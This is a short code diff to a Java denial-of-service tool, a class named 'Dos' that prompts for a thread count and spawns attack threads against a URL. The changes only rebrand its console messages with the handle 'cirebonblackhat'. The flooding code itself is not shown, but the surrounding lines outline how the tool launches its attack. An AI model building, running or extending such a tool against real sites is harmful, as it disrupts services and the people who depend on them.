@@ -66,7 +66,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
+       System.out.println("Setting DDoS By: Shadow cirebonblackhat");
 
         System.out.print("Thread: ");
         String amount = in.nextLine();
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Starting Attack");
+        System.out.println("Starting Attack by cirebonblackhat");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
